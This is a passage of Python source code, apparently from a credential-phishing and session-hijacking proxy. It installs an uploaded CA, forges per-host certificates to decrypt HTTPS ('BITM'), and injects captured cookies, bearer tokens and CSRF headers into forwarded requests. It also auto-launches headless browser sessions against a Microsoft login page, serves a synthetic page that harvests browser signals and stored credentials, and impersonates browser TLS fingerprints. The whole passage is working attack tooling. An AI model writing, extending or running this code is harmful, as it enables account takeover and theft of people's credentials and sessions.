                key_pub, rsa.RSAPublicKey):
            matched = (cert_pub.public_numbers().n
                        == key_pub.public_numbers().n)
        elif isinstance(cert_pub, ec.EllipticCurvePublicKey) and isinstance(
                key_pub, ec.EllipticCurvePublicKey):
            cn = cert_pub.public_numbers()
            kn = key_pub.public_numbers()
            matched = (cn.x == kn.x and cn.y == kn.y
                        and cn.curve.name == kn.curve.name)
    except Exception:
        matched = False
    if not matched:
        return {"ok": False,
                "error": "private key does not match certificate "
                         "public key — upload the matching pair"}

    # Sanity-check cert is actually a CA.
    is_ca_extension = False
    try:
        bc = cert.extensions.get_extension_for_class(x509.BasicConstraints)
        is_ca_extension = bool(bc.value.ca)
    except Exception:
        is_ca_extension = False
    warnings: list[str] = []
    if not is_ca_extension:
        warnings.append(
            "cert does not have BasicConstraints CA:TRUE — browsers "
            "will refuse to use it for trust-store-based BITM. Re-issue "
            "the cert with the CA flag set if you want to use it as a "
            "BITM root.")

    # Persist atomically to avoid a half-written swap if something
    # crashes mid-write.
    ca_dir = _get_ca_dir()
    cert_path = ca_dir / "ca.crt"
    key_path = ca_dir / "ca.key"
    cert_tmp = cert_path.with_suffix(".crt.tmp")
    key_tmp = key_path.with_suffix(".key.tmp")
    try:
        cert_tmp.write_bytes(cert_pem_b)
        key_tmp.write_bytes(key_pem_b)
        os.chmod(key_tmp, 0o600)
        os.replace(cert_tmp, cert_path)
        os.replace(key_tmp, key_path)
    except Exception as e:
        for p in (cert_tmp, key_tmp):
            try:
                if p.exists():
                    p.unlink()
            except Exception:
                pass
        return {"ok": False, "error": f"failed to write to "
                                       f"{ca_dir}: {e}"}

    # Hot-swap in-memory state.
    _ca_cert = cert
    _ca_key = key
    _CA_DIR = ca_dir
    # Clear any per-host certs that were minted under the OLD CA —
    # next connection generates a new leaf with the new CA's
    # signature.
    try:
        # _host_cert_cache (if it exists) gets cleared. Variable lives
        # in this module; introspect rather than crash on absence.
        for name in ("_host_cert_cache", "_host_certs", "_cert_cache"):
            cache = globals().get(name)
            if isinstance(cache, dict):
                cache.clear()
    except Exception:
        pass

    append_log("info", "auth_proxy",
               f"CA replaced via upload — subject="
               f"{cert.subject.rfc4514_string()[:120]}, "
               f"warnings={len(warnings)}")
    return {"ok": True, "info": get_ca_info(), "warnings": warnings}


def reset_ca() -> dict:
    """Wipe the persisted CA cert + key. Next call to `_ensure_ca()`
    generates a fresh self-signed pair (operator must re-trust it on
    every subject device)."""
    global _ca_key, _ca_cert
    ca_dir = _get_ca_dir()
    removed: list[str] = []
    for fname in ("ca.crt", "ca.key"):
        p = ca_dir / fname
        if p.exists():
            try:
                p.unlink()
                removed.append(fname)
            except Exception as e:
                return {"ok": False,
                        "error": f"failed to remove {fname}: {e}"}
    _ca_cert = None
    _ca_key = None
    for name in ("_host_cert_cache", "_host_certs", "_cert_cache"):
        cache = globals().get(name)
        if isinstance(cache, dict):
            cache.clear()
    append_log("info", "auth_proxy",
               f"CA reset (removed: {', '.join(removed) or 'nothing'})")
    return {"ok": True, "removed": removed}


def _make_host_cert(hostname: str):
    """Generate a cert for a specific hostname, signed by our CA."""
    try:
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        import datetime

        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        cert = (
            x509.CertificateBuilder()
            .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, hostname)]))
            .issuer_name(_ca_cert.subject)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.datetime.utcnow())
            .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))
            .add_extension(
                x509.SubjectAlternativeName([x509.DNSName(hostname)]),
                critical=False)
            .sign(_ca_key, hashes.SHA256())
        )
        return key, cert
    except Exception:
        return None, None


def _make_ssl_context(hostname: str):
    """Create an SSL context with a host-specific cert for BITM."""
    key, cert = _make_host_cert(hostname)
    if not key or not cert:
        return None
    from cryptography.hazmat.primitives import serialization
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    # Write to temp files (ssl module needs files)
    with tempfile.NamedTemporaryFile(suffix=".pem", delete=False) as kf:
        kf.write(key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.TraditionalOpenSSL,
            serialization.NoEncryption()))
        key_file = kf.name
    with tempfile.NamedTemporaryFile(suffix=".pem", delete=False) as cf:
        cf.write(cert.public_bytes(serialization.Encoding.PEM))
        cert_file = cf.name
    try:
        ctx.load_cert_chain(cert_file, key_file)
    finally:
        os.unlink(key_file)
        os.unlink(cert_file)
    return ctx


# ── Credential matching ──────────────────────────────────

def _domain_to_site_ids(hostname: str) -> list[str]:
    """Convert a hostname to possible site_id formats for credential lookup."""
    # site_id format: netloc with : and . replaced by _
    site_id = hostname.replace(":", "_").replace(".", "_")
    candidates = [site_id]
    # Also try without www_
    if site_id.startswith("www_"):
        candidates.append(site_id[4:])
    return candidates


def _get_all_credentials_for_host(hostname: str) -> list[dict]:
    """Find ALL captured credentials matching a hostname (all users)."""
    results = []
    site_ids = _domain_to_site_ids(hostname)
    all_keys = credentials_store.list_keys()

    for key in all_keys:
        # Check exact match or user-scoped match (site_id__user)
        base_key = key.split("__")[0] if "__" in key else key
        if base_key in site_ids:
            data = credentials_store.get(key)
            if data:
                data["_cred_key"] = key
                results.append(data)
            continue
        # Subdomain match (exact domain or *.domain)
        domain = base_key.replace("_", ".")
        if hostname == domain or hostname.endswith("." + domain):
            data = credentials_store.get(key)
            if data:
                data["_cred_key"] = key
                results.append(data)

    return results


def _get_credentials_for_host(hostname: str) -> dict | None:
    """Find the best captured credentials matching a hostname.
    Returns the most recently captured set across all users."""
    all_creds = _get_all_credentials_for_host(hostname)
    if not all_creds:
        return None
    # Return the most recently captured
    return max(all_creds, key=lambda d: d.get("captured_at", 0))


def _build_cookie_header(creds: dict, hostname: str) -> str:
    """Build a Cookie header from captured cookies matching the target host."""
    cookies = creds.get("cookies", [])
    # Also check cookies_store for the site
    parts = []
    seen = set()
    for c in cookies:
        name = c.get("name", "")
        value = c.get("value", "")
        domain = c.get("domain", "").lstrip(".")
        if not name or not value:
            continue
        # Match domain
        if domain and not hostname.endswith(domain):
            continue
        if name not in seen:
            parts.append(f"{name}={value}")
            seen.add(name)
    return "; ".join(parts)


def _build_auth_headers(creds: dict) -> dict:
    """Extract authorization headers from captured data."""
    headers = {}
    ch = creds.get("captured_headers", {})

    # Bearer token
    for key in ["Authorization: Bearer", "access_token", "accessToken"]:
        if key in ch:
            val = ch[key].get("value", "")
            if val:
                if key == "Authorization: Bearer":
                    headers["Authorization"] = f"Bearer {val}"
                else:
                    headers["Authorization"] = f"Bearer {val}"
                break

    # Other captured auth headers (csrf tokens, etc.)
    for name, info in ch.items():
        if name.startswith("Cookie:"):
            continue  # cookies handled separately
        if name in ("Authorization: Bearer", "access_token", "accessToken"):
            continue  # already handled
        # Map captured header names to actual HTTP headers
        lower = name.lower()
        if any(kw in lower for kw in ("csrf", "xsrf", "x-ms-token", "x-auth")):
            headers[name] = info.get("value", "")

    return headers


# ── Proxy handler ─────────────────────────────────────────

def _log(msg: str, level: str = "info"):
    append_log(level, "auth_proxy", msg)


# ── Auto-launched Playwright sessions ────────────────────
# On first connection for a (site, user) pair, spin up a headless Playwright
# session pointed at the configured login page so subsequent requests routed
# via `proxy_via_playwright` have an authenticated context to flow through.

class _AutoSession:
    __slots__ = ("sid", "site_id", "user_id", "ready", "launched_at", "launching")
    def __init__(self, site_id: str, user_id: str):
        self.sid: str = ""
        self.site_id: str = site_id
        self.user_id: str = user_id
        self.ready: asyncio.Event = asyncio.Event()
        self.launched_at: float = time.time()
        self.launching: bool = False


# Key: (site_id, user_id) — user_id "" means pre-auth.
_auto_sessions: dict[tuple[str, str], _AutoSession] = {}
_auto_sessions_lock = asyncio.Lock()


def _unroutable(hostname: str, reason: str) -> None:
    """Emit a log entry on the `proxy_unroutable` category."""
    append_log("info", "proxy_unroutable", f"{hostname}: {reason}")


def _resolve_login_url(site_id: str) -> str:
    """Derive the login URL for a hostname. Falls back to default_login_url."""
    # If the site_id matches a stored credential, we may have a saved login URL.
    for key in credentials_store.list_keys():
        base_key = key.split("__")[0] if "__" in key else key
        if base_key == site_id:
            data = credentials_store.get(key) or {}
            cu = data.get("current_url") or ""
            if cu:
                return cu
    return get_config_value("default_login_url",
                            "https://myapps.microsoft.com")


def _lookup_captured_user(hostname: str) -> str:
    """Return the most recently captured user_id for a hostname, or ''."""
    creds = _get_credentials_for_host(hostname)
    if not creds:
        return ""
    return str(creds.get("user_id") or "")


def _auto_session_healthy(rec: _AutoSession) -> bool:
    """Is this session still usable? Checks _live_pages liveness."""
    if not rec.sid:
        return False
    try:
        from backend.routes.browser import _live_pages
    except Exception:
        return False
    page = _live_pages.get(rec.sid)
    if page is None:
        return False
    try:
        if getattr(page, "is_closed", lambda: False)():
            return False
    except Exception:
        return False
    return True


async def _launch_and_register(rec: _AutoSession, login_url: str) -> None:
    """Launch the Playwright session, populate rec.sid, signal readiness."""
    try:
        from backend.routes.browser import launch_auto_session
    except Exception as e:
        _log(f"AUTO_SESSION import failed: {e}", level="warn")
        rec.ready.set()
        return
    try:
        sid = await launch_auto_session(
            login_url, site_id=rec.site_id, user_id=rec.user_id)
        rec.sid = sid
        _log(f"AUTO_SESSION launched sid={sid} site={rec.site_id} "
             f"user={rec.user_id or '(none)'}")
    except Exception as e:
        _log(f"AUTO_SESSION launch failed for site={rec.site_id}: {e}",
             level="warn")
    finally:
        rec.ready.set()
        rec.launching = False


async def _ensure_auto_session_for(hostname: str) -> _AutoSession | None:
    """Return a live auto-launched session for this hostname, launching one
    if needed. Returns None when the feature is off or hostname is empty."""
    if not get_config_value("autostart_playwright_from_proxy", False):
        return None
    if not hostname:
        return None
    site_id = _domain_to_site_ids(hostname)[0]
    user_id = _lookup_captured_user(hostname)
    key = (site_id, user_id)

    async with _auto_sessions_lock:
        rec = _auto_sessions.get(key)
        if rec and _auto_session_healthy(rec):
            return rec
        # Dead session — fall through to relaunch (discard stale record).
        if rec and not rec.launching:
            _auto_sessions.pop(key, None)

        # If we have a user_id now and there's a matching pre-auth session,
        # promote it rather than launching a fresh one.
        if user_id:
            pre = _auto_sessions.get((site_id, ""))
            if pre and _auto_session_healthy(pre):
                _auto_sessions.pop((site_id, ""), None)
                pre.user_id = user_id
                _auto_sessions[key] = pre
                return pre

        rec = _AutoSession(site_id=site_id, user_id=user_id)
        rec.launching = True
        _auto_sessions[key] = rec
        login_url = _resolve_login_url(site_id)

    asyncio.create_task(_launch_and_register(rec, login_url))
    return rec


async def rekey_auto_session(site_id: str, new_user_id: str) -> None:
    """Move a pre-auth entry (site_id, '') to (site_id, new_user_id). Called
    by browser.py when a user_id is captured on the login page."""
    if not new_user_id:
        return
    async with _auto_sessions_lock:
        pre = _auto_sessions.pop((site_id, ""), None)
        if not pre:
            return
        pre.user_id = new_user_id
        _auto_sessions[(site_id, new_user_id)] = pre
        _log(f"AUTO_SESSION rekey site={site_id} -> user={new_user_id} "
             f"sid={pre.sid}")


async def _stop_all_auto_sessions() -> None:
    """Close every auto-launched browser. Called from stop_auth_proxy()."""
    try:
        from backend.routes.browser import close_auto_session
    except Exception:
        return
    async with _auto_sessions_lock:
        records = list(_auto_sessions.values())
        _auto_sessions.clear()
    for rec in records:
        if rec.sid:
            try:
                await close_auto_session(rec.sid)
            except Exception:
                pass


async def _handle_client(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    """Handle one proxy connection."""
    global _request_count, _inject_count
    try:
        request_line = await asyncio.wait_for(reader.readline(), timeout=10)
        if not request_line:
            writer.close()
            return
        request_str = request_line.decode(errors="replace").strip()
        _request_count += 1

        parts = request_str.split()
        if len(parts) < 3:
            writer.close()
            return

        method, target, version = parts[0], parts[1], parts[2]

        # Read all client headers
        raw_headers = []
        while True:
            line = await asyncio.wait_for(reader.readline(), timeout=5)
            if line in (b"\r\n", b"\n", b""):
                break
            raw_headers.append(line.decode(errors="replace").rstrip("\r\n"))

        # Auto-launch a Playwright session for this (site, user) if enabled.
        # We derive the hostname from CONNECT's target or HTTP's absolute URL.
        if method == "CONNECT":
            hostname = target.split(":", 1)[0]
        else:
            hostname = urlparse(target).hostname or ""
        rec = await _ensure_auto_session_for(hostname)
        if rec and not rec.ready.is_set():
            wait_s = get_config_value("auto_login_wait_seconds", 10)
            try:
                await asyncio.wait_for(rec.ready.wait(), timeout=wait_s)
            except asyncio.TimeoutError:
                _log(f"AUTO_SESSION timeout ({wait_s}s) for {hostname} "
                     f"site={rec.site_id} — falling through", level="warn")

        if method == "CONNECT":
            await _handle_connect(reader, writer, target, raw_headers)
        else:
            await _handle_http(reader, writer, method, target, version, raw_headers)

    except Exception as e:
        _log(f"Handler error: {e}", "warn")
    finally:
        try:
            writer.close()
        except Exception:
            pass


async def _handle_http(reader, writer, method, target, version, raw_headers):
    """Handle plain HTTP request — inject credentials and forward."""
    global _inject_count
    parsed = urlparse(target)
    hostname = parsed.hostname or ""
    port = parsed.port or 80
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query

    if not host_allowed_for_proxy(hostname):
        await _plain_http_passthrough(reader, writer, method, path, version,
                                       raw_headers, hostname, port)
        return

    # Parse existing headers into a dict
    headers = {}
    for h in raw_headers:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()

    # Capture client-side state for later hydration
    _capture_request(hostname, headers, target)

    # Probe-callback interception: the synthetic registration page POSTs
    # JS-only signals to a sentinel path on the captured host; we consume
    # it here and hand off to backend.devices without the request ever
    # reaching the upstream origin.
    if method.upper() == "POST" and _is_probe_callback(path):
        await _handle_probe_callback(reader, writer, hostname, path, headers)
        return

    # Active device registration: serve a one-shot synthetic page that
    # extracts JS signals, posts them back, and redirects to the original
    # URL. Only fires while a pending probe exists for this hostname.
    if method.upper() == "GET":
        try:
            from backend import devices as _dev
            pending = _dev.get_pending_probe(hostname)
        except Exception:
            pending = None
        if pending and get_config_value("device_probe_enabled", True):
            want_storage = "creds" in (pending.get("modes") or [])
            resp = _build_probe_response(
                hostname, target, pending["token"],
                pending["device_id"], want_storage)
            writer.write(resp)
            await writer.drain()
            append_log("info", "devices",
                       f"DEVICE_PROBE_PAGE_SERVED host={hostname} "
                       f"device={pending['device_id']} "
                       f"storage={want_storage} transport=http")
            return

    # Look up credentials
    creds = _get_credentials_for_host(hostname)
    injected = []
    if creds:
        # Inject cookies
        cookie_header = _build_cookie_header(creds, hostname)
        if cookie_header:
            existing = headers.get("Cookie", "")
            if existing:
                headers["Cookie"] = existing + "; " + cookie_header
            else:
                headers["Cookie"] = cookie_header
            injected.append(f"cookies({cookie_header.count(';') + 1})")

        # Inject auth headers
        auth_headers = _build_auth_headers(creds)
        for k, v in auth_headers.items():
            if k not in headers:  # don't overwrite client-set headers
                headers[k] = v
                injected.append(k)

    if injected:
        _inject_count += 1
        _log(f"HTTP {method} {hostname}{path[:120]}  INJECT<- {', '.join(injected)}")
    else:
        _log(f"HTTP {method} {hostname}{path[:120]}  (no injection)")

    # Optional: route this request through an active Playwright session
    if get_config_value("proxy_via_playwright", False):
        body_bytes = b""
        cl = int(headers.get("Content-Length", 0))
        if cl > 0:
            body_bytes = await reader.read(cl)
        full_url = f"http://{hostname}:{port}{path}" if port != 80 else f"http://{hostname}{path}"
        result = await _fetch_via_playwright(full_url, method, headers, body_bytes)
        if result is not None:
            status, resp_headers, resp_body = result
            # Capture response headers + cookies
            raw_headers = [f"{k}: {v}" for k, v in resp_headers.items()]
            _capture_response_headers(hostname, raw_headers)
            _write_http_response(writer, status, resp_headers, resp_body)
            await writer.drain()
            return

    # Read body once so both impersonate path and stock path can use it.
    if "Host" not in headers:
        headers["Host"] = hostname if port == 80 else f"{hostname}:{port}"
    cl = int(headers.get("Content-Length", 0))
    body_bytes = await reader.read(cl) if cl > 0 else b""

    # Allowlisted body capture into the Flow Trace synthetic session.
    bc_active_http = _body_capture_should(hostname)
    bc_req_id_http = (
        f"http_{id(reader)}_{int(time.time()*1000)}"
        if bc_active_http else None)
    if bc_active_http:
        _body_capture_request(hostname, method, target, headers,
                               body_bytes, req_id=bc_req_id_http)

    # Plain HTTP goes over cleartext; the TLS fingerprint issue doesn't
    # apply. We still route through curl_cffi when the toggle is on so
    # other header-level browser defaults (Accept ordering, etc.) match.
    imp_target = _pick_impersonate_target(hostname, headers)
    if imp_target is not None:
        url_for_curl = f"http://{hostname}{':' + str(port) if port != 80 else ''}{path}"
        ok = await _upstream_fetch_impersonate(
            writer, url_for_curl, method, headers,
            body_bytes, imp_target, hostname,
            capture_req_id=bc_req_id_http)
        if ok:
            return

    # Rebuild and forward the request
    try:
        remote_reader, remote_writer = await asyncio.wait_for(
            asyncio.open_connection(hostname, port), timeout=10)
    except Exception as e:
        _log(f"Connect failed {hostname}:{port} — {e}", "warn")
        writer.write(b"HTTP/1.1 502 Bad Gateway\r\n\r\n")
        await writer.drain()
        return

    # Build request
    req = f"{method} {path} {version}\r\n"
    for k, v in headers.items():
        req += f"{k}: {v}\r\n"
    req += "\r\n"
    remote_writer.write(req.encode())
    await remote_writer.drain()

    # Forward request body (already read above).
    if body_bytes:
        remote_writer.write(body_bytes)
        await remote_writer.drain()

    # Stream response back, capturing Set-Cookie from the header block
    # and (when allowlisted) buffering body bytes for the Flow Trace
    # synthetic session.
    try:
        header_buf = b""
        headers_done = False
        bc_status = 0
        bc_resp_headers: dict[str, str] = {}
        bc_body_buf = b"" if bc_active_http else None
        _BC_MAX = 64 * 1024
        while True:
            data = await remote_reader.read(65536)
            if not data:
                break
            writer.write(data)
            await writer.drain()
            if not headers_done:
                header_buf += data
                idx = header_buf.find(b"\r\n\r\n")
                if idx >= 0:
                    hdr_text = header_buf[:idx].decode("latin-1", errors="replace")
                    lines = hdr_text.split("\r\n")
                    _capture_response_headers(hostname, lines[1:])
                    if bc_active_http:
                        try:
                            bc_status = int(lines[0].split(" ", 2)[1])
                        except Exception:
                            bc_status = 0
                        for h in lines[1:]:
                            if ":" not in h:
                                continue
                            k, v = h.split(":", 1)
                            bc_resp_headers[k.strip()] = v.strip()
                        leftover = header_buf[idx + 4:]
                        if leftover and len(bc_body_buf) < _BC_MAX:
                            bc_body_buf += leftover[:_BC_MAX - len(bc_body_buf)]
                    headers_done = True
                    header_buf = b""
                elif len(header_buf) > 65536:
                    # Safety: don't buffer forever
                    headers_done = True
                    header_buf = b""
            elif bc_body_buf is not None and len(bc_body_buf) < _BC_MAX:
                bc_body_buf += data[:_BC_MAX - len(bc_body_buf)]
        if bc_active_http and bc_req_id_http:
            _body_capture_response(hostname, bc_req_id_http, bc_status,
                                    bc_resp_headers, bc_body_buf or b"")
    except Exception:
        pass
    remote_writer.close()


async def _handle_connect(reader, writer, target, raw_headers):
    """Handle HTTPS CONNECT — BITM if CA is available, else plain tunnel."""
    global _inject_count
    host_port = target.split(":")
    hostname = host_port[0]
    port = int(host_port[1]) if len(host_port) > 1 else 443

    creds = _get_credentials_for_host(hostname)
    has_ca = _ca_key is not None

    if not host_allowed_for_proxy(hostname):
        _log(f"TUNNEL {hostname}:{port} (not in proxy_allowed_hosts — passthrough, no BITM)", "debug")
        await _plain_tunnel(reader, writer, hostname, port)
        return

    # Always BITM when a CA is available so we can capture state; injection
    # still happens when creds exist, and no-op otherwise.
    if has_ca:
        await _bitm_connect(reader, writer, hostname, port, creds)
    else:
        if creds:
            _log(f"TUNNEL {hostname}:{port} (has creds but no CA — install cryptography for BITM)")
        await _plain_tunnel(reader, writer, hostname, port)


async def _plain_tunnel(reader, writer, hostname, port):
    """Simple CONNECT tunnel — no BITM, no injection."""
    try:
        remote_reader, remote_writer = await asyncio.wait_for(
            asyncio.open_connection(hostname, port), timeout=10)
    except Exception as e:
        _log(f"CONNECT failed {hostname}:{port} — {e}", "warn")
        writer.write(b"HTTP/1.1 502 Bad Gateway\r\n\r\n")
        await writer.drain()
        return

    writer.write(b"HTTP/1.1 200 Connection established\r\n\r\n")
    await writer.drain()

    async def pipe(src, dst):
        try:
            while True:
                data = await src.read(65536)
                if not data:
                    break
                dst.write(data)
                await dst.drain()
        except Exception:
            pass

    _log(f"TUNNEL {hostname}:{port}", "debug")
    await asyncio.gather(pipe(reader, remote_writer), pipe(remote_reader, writer))
    remote_writer.close()


async def _plain_http_passthrough(reader, writer, method, path, version, raw_headers, hostname, port):
    """Byte-faithful single-request relay for hosts not in
    proxy_allowed_hosts — no capture, no credential injection, no
    probe/device interception. The plain-HTTP counterpart to
    _plain_tunnel's role for CONNECT."""
    content_length = 0
    for h in raw_headers:
        if ":" in h and h.split(":", 1)[0].strip().lower() == "content-length":
            try:
                content_length = int(h.split(":", 1)[1].strip())
            except ValueError:
                content_length = 0
            break
    body = await reader.read(content_length) if content_length > 0 else b""

    try:
        remote_reader, remote_writer = await asyncio.wait_for(
            asyncio.open_connection(hostname, port), timeout=10)
    except Exception as e:
        _log(f"Connect failed {hostname}:{port} (passthrough) — {e}", "warn")
        writer.write(b"HTTP/1.1 502 Bad Gateway\r\n\r\n")
        await writer.drain()
        return

    req = f"{method} {path} {version}\r\n"
    for h in raw_headers:
        req += h + "\r\n"
    req += "\r\n"
    remote_writer.write(req.encode())
    await remote_writer.drain()
    if body:
        remote_writer.write(body)
        await remote_writer.drain()

    _log(f"HTTP {method} {hostname}{path[:120]}  (not in proxy_allowed_hosts — passthrough)", "debug")
    try:
        while True:
            data = await remote_reader.read(65536)
            if not data:
                break
            writer.write(data)
            await writer.drain()
    except Exception:
        pass
    remote_writer.close()


async def _bitm_connect(reader, writer, hostname, port, creds):
    """BITM CONNECT — decrypt, inject credentials, re-encrypt."""
    global _inject_count

    # Tell client the tunnel is established
    writer.write(b"HTTP/1.1 200 Connection established\r\n\r\n")
    await writer.drain()

    # Create SSL context with a cert for this hostname
    server_ctx = _make_ssl_context(hostname)
    if not server_ctx:
        _log(f"BITM cert generation failed for {hostname}, falling back to tunnel", "warn")
        _unroutable(hostname, "cert_generation_failed")
        # Already sent 200, so just pipe through raw
        try:
            remote_reader, remote_writer = await asyncio.wait_for(
                asyncio.open_connection(hostname, port), timeout=10)
            async def pipe(src, dst):
                try:
                    while True:
                        data = await src.read(65536)
                        if not data:
                            break
                        dst.write(data)
                        await dst.drain()
                except Exception:
                    pass
            await asyncio.gather(pipe(reader, remote_writer), pipe(remote_reader, writer))
            remote_writer.close()
        except Exception:
            pass
        return

    # Upgrade client connection to TLS (we act as the server)
    transport = writer.transport
    loop = asyncio.get_event_loop()

    try:
        tls_transport = await loop.start_tls(transport, transport.get_protocol(),
                                             server_ctx, server_side=True)
        # Create new reader/writer for the TLS connection
        tls_reader = asyncio.StreamReader()
        protocol = asyncio.StreamReaderProtocol(tls_reader)
        tls_transport.set_protocol(protocol)
        protocol.connection_made(tls_transport)
        tls_writer = asyncio.StreamWriter(tls_transport, protocol, tls_reader, loop)
    except Exception as e:
        tb = traceback.format_exc()
        _log(f"BITM TLS handshake failed for {hostname}: "
             f"{type(e).__name__}: {e!r}\n{tb}", "warn")
        _unroutable(hostname, f"tls_handshake_failed: {type(e).__name__}: {e!r}")
        return

    # Now read the actual HTTP request from the TLS-unwrapped client
    try:
        request_line = await asyncio.wait_for(tls_reader.readline(), timeout=10)
        if not request_line:
            return
        request_str = request_line.decode(errors="replace").strip()
        parts = request_str.split()
        if len(parts) < 3:
            return
        method, path, version = parts[0], parts[1], parts[2]

        # Read headers
        headers = {}
        raw_header_lines = []
        while True:
            line = await asyncio.wait_for(tls_reader.readline(), timeout=5)
            if line in (b"\r\n", b"\n", b""):
                break
            decoded = line.decode(errors="replace").rstrip("\r\n")
            raw_header_lines.append(decoded)
            if ":" in decoded:
                k, v = decoded.split(":", 1)
                headers[k.strip()] = v.strip()

        # Capture client-side state flowing through the BITM
        full_url = f"https://{hostname}{path}"
        _capture_request(hostname, headers, full_url)

        # Probe-callback interception (sentinel POST from the synthetic
        # registration page). Consume + return 204; never touch upstream.
        if method.upper() == "POST" and _is_probe_callback(path):
            await _handle_probe_callback(tls_reader, tls_writer, hostname,
                                          path, headers)
            return

        # Active device registration: serve the synthetic probe page on
        # the next GET to a host with a pending registration.
        if method.upper() == "GET":
            try:
                from backend import devices as _dev
                pending = _dev.get_pending_probe(hostname)
            except Exception:
                pending = None
            if pending and get_config_value("device_probe_enabled", True):
                want_storage = "creds" in (pending.get("modes") or [])
                resp = _build_probe_response(
                    hostname, full_url, pending["token"],
                    pending["device_id"], want_storage)
                tls_writer.write(resp)
                await tls_writer.drain()
                append_log("info", "devices",
                           f"DEVICE_PROBE_PAGE_SERVED host={hostname} "
                           f"device={pending['device_id']} "
                           f"storage={want_storage} transport=https")
                return

        # Detect requests that can't be served via the Playwright fetch path.
        # We only log; the normal forwarding path continues so the browser
        # still gets a response (just without Playwright-session auth).
        upgrade_hdr = headers.get("Upgrade", "") or headers.get("upgrade", "")
        if upgrade_hdr.lower() == "websocket":
            _unroutable(hostname, "websocket_upgrade")

        # Inject credentials (only if we have them)
        injected = []
        if creds:
            cookie_header = _build_cookie_header(creds, hostname)
            if cookie_header:
                existing = headers.get("Cookie", "")
                if existing:
                    headers["Cookie"] = existing + "; " + cookie_header
                else:
                    headers["Cookie"] = cookie_header
                injected.append(f"cookies({cookie_header.count(';') + 1})")

            auth_headers = _build_auth_headers(creds)
            for k, v in auth_headers.items():
                if k not in headers:
                    headers[k] = v
                    injected.append(k)

        if injected:
            _inject_count += 1
            _log(f"BITM_INJECT {method} https://{hostname}{path[:80]} <- {', '.join(injected)}")

        # Optional: route via Playwright session instead of direct upstream
        if get_config_value("proxy_via_playwright", False):
            body_bytes = b""
            cl = int(headers.get("Content-Length", 0))
            if cl > 0:
                body_bytes = await tls_reader.read(cl)
            full_url = f"https://{hostname}{path}"
            result = await _fetch_via_playwright(full_url, method, headers, body_bytes)
            if result is not None:
                status, resp_headers, resp_body = result
                raw_headers = [f"{k}: {v}" for k, v in resp_headers.items()]
                _capture_response_headers(hostname, raw_headers)
                _write_http_response(tls_writer, status, resp_headers, resp_body)
                await tls_writer.drain()
                return

        # Read the request body once — both the impersonate path and the
        # stock-TLS fallback need it, so keep a single copy rather than
        # consuming tls_reader twice.
        cl = int(headers.get("Content-Length", 0))
        body_bytes = await tls_reader.read(cl) if cl > 0 else b""

        # Allowlisted body-capture into the Flow Trace synthetic
        # session. Run before the upstream fetch so the request side
        # is recorded even if the fetch raises.
        bc_req_id = f"bitm_{id(tls_reader)}_{int(time.time()*1000)}"
        bc_active = _body_capture_should(hostname)
        if bc_active:
            _body_capture_request(
                hostname, method, full_url, headers, body_bytes,
                req_id=bc_req_id)

        # Impersonated upstream (curl_cffi) when the fingerprint toggle
        # is on and we recognise the captured UA. Returns True when the
        # response has been fully written — otherwise we fall through
        # to the stock OpenSSL path below.
        imp_target = _pick_impersonate_target(hostname, headers)
        if imp_target is not None:
            url_for_curl = f"https://{hostname}{path}"
            ok = await _upstream_fetch_impersonate(
                tls_writer, url_for_curl, method, headers,
                body_bytes, imp_target, hostname,
                capture_req_id=(bc_req_id if bc_active else None))
            if ok:
                return

        # Connect to real server over TLS (direct path)
        client_ctx = ssl.create_default_context()
        if get_config_value("ignore_ssl", False):
            client_ctx.check_hostname = False
            client_ctx.verify_mode = ssl.CERT_NONE

        remote_reader, remote_writer = await asyncio.wait_for(
            asyncio.open_connection(hostname, port, ssl=client_ctx), timeout=10)

        # Forward the request with injected headers
        req = f"{method} {path} {version}\r\n"
        for k, v in headers.items():
            req += f"{k}: {v}\r\n"
        req += "\r\n"
        remote_writer.write(req.encode())
        await remote_writer.drain()

        # Forward request body (already consumed from tls_reader above)
        if body_bytes:
            remote_writer.write(body_bytes)
            await remote_writer.drain()

        # Stream response back to client, capturing Set-Cookie from
        # headers and (when allowlisted) buffering up to 64 KB of the
        # decoded body for the Flow Trace synthetic session.
        header_buf = b""
        headers_done = False
        bc_status = 0
        bc_resp_headers: dict[str, str] = {}
        bc_body_buf = b"" if bc_active else None
        _BC_MAX = 64 * 1024
        while True:
            data = await remote_reader.read(65536)
            if not data:
                break
            tls_writer.write(data)
            await tls_writer.drain()
            if not headers_done:
                header_buf += data
                idx = header_buf.find(b"\r\n\r\n")
                if idx >= 0:
                    hdr_text = header_buf[:idx].decode("latin-1", errors="replace")
                    lines = hdr_text.split("\r\n")
                    _capture_response_headers(hostname, lines[1:])
                    if bc_active:
                        # Status from the response line.
                        try:
                            bc_status = int(lines[0].split(" ", 2)[1])
                        except Exception:
                            bc_status = 0
                        for h in lines[1:]:
                            if ":" not in h:
                                continue
                            k, v = h.split(":", 1)
                            bc_resp_headers[k.strip()] = v.strip()
                        # Anything past the header block belongs to the body.
                        leftover = header_buf[idx + 4:]
                        if leftover and len(bc_body_buf) < _BC_MAX:
                            bc_body_buf += leftover[:_BC_MAX - len(bc_body_buf)]
                    headers_done = True
                    header_buf = b""
                elif len(header_buf) > 65536:
                    headers_done = True
                    header_buf = b""
            elif bc_body_buf is not None and len(bc_body_buf) < _BC_MAX:
                bc_body_buf += data[:_BC_MAX - len(bc_body_buf)]

        if bc_active:
            _body_capture_response(hostname, bc_req_id, bc_status,
                                    bc_resp_headers, bc_body_buf or b"")

        remote_writer.close()

    except asyncio.TimeoutError:
        # Chromium aggressively opens speculative TLS preconnects and
        # frequently doesn't reuse them — the request-line read at the
        # top of the TLS handshake then hits the 10s timeout. This is
        # expected background noise, not a session failure: log at
        # debug without the traceback so the dashboard's All Logs view
        # stays signal-heavy.
        _log(f"BITM idle preconnect closed for {hostname}", "debug")
    except Exception as e:
        tb = traceback.format_exc()
        _log(f"BITM request handling error for {hostname}: "
